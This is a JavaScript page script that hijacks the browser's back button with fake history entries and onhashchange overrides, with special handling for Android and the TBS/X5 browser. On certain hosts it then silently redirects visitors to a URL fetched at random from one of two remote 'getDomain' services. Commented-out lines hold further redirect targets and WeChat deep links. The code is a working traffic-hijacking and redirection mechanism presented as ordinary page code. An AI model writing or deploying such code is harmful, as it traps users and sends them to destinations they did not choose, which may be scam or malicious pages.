window.onpageshow = function() {
    sessionStorage.getItem('jumpOut') && a();
}

function a() {
    //location.href = "https://mp.weixin.qq.com/s/jodGwOTeDD1E_uH-npWK6g";
    let apiUrl = '';
    let hostnameMp = window.location.hostname;
    //https://api.jianyuekeji.cn/api/getDomain/5133_jdvue9vejevmeusg
    //https://api.hbty002.cn/task/getDomain?hh=zz100&cs=2&pp=1
    //https://api.hbty002.cn/task/getDomain?hh=bx28&cs=2&pp=1
    
    if(hostnameMp.startsWith('v.best22')){
        
     
       var rand_n = Math.floor(Math.random() * 100);
        if(rand_n <= 50){
            apiUrl = 'https://api.hbty002.cn/task/getDomain?hh=zz100&cs=2&pp=1';
        }else{
            apiUrl = 'https://api.jianyuekeji.cn/api/getDomain/5133_jdvue9vejevmeusg';
        }
        window.fetch(apiUrl).then(function(res) {
            return res.json();
        }).then(function(data) {
            location.href = data.url;
        })
       
       /*
            let timeid = new Date().getTime().toString().substr(-11,5);
             location.href = "http://new.best22.cn/maps#1231" + timeid;
        */
        /*
        apiUrl = 'https://api.jianyuekeji.cn/api/getDomain/5134_4kwyn83uebbffavk';
        
        if(apiUrl){
            window.fetch(apiUrl).then(function(res) {
                return res.json();
            }).then(function(data) {
                location.href = data.url;
            })
        }else{
            location.href = "weixin://dl/business/?appid=wx33474b7963e5638b&path=pages/index/index&query=fromHost%3Dmp:"+ window.location.hostname +"%26fromNid%3D" + dataInfo.nid;
        }
        */
        
    
    }else if(hostnameMp.startsWith('dw225')){
        //location.href = "https://mp.weixin.qq.com/s/_AiqHEO_r2Tb4P5yAbsyrQ";
    }else{
          
        /*
        location.href = "weixin://dl/business/?appid=wx33474b7963e5638b&path=pages/index/index&query=fromHost%3Dmp:"+ window.location.hostname +"%26fromNid%3D" + dataInfo.nid;
        */
        
    }
}

function ntzgo() {
    history.pushState(history.length + 1, "message", window.location.href.split("#")[0] + "#" + new Date()
        .getTime());
    if (navigator.userAgent.indexOf("Android") != -1) {
        if (typeof(tbsJs) != "undefined") {
            tbsJs.onReady("{useCachedApi : 'true'}", function(e) {});
            window.onhashchange = function() {
                window.history.pushState("forward", null, "#");
                window.history.forward(1);
                a()
            }
        } else {
            var pop = 0;
            window.onhashchange = function(event) {
                pop++;
                if (pop >= 3) {
                    a()
                } else {
                    history.go(1)
                }
            };
            history.go(-1)
        }
    } else {
        window.onhashchange = function() {
            a()
        }
    }
};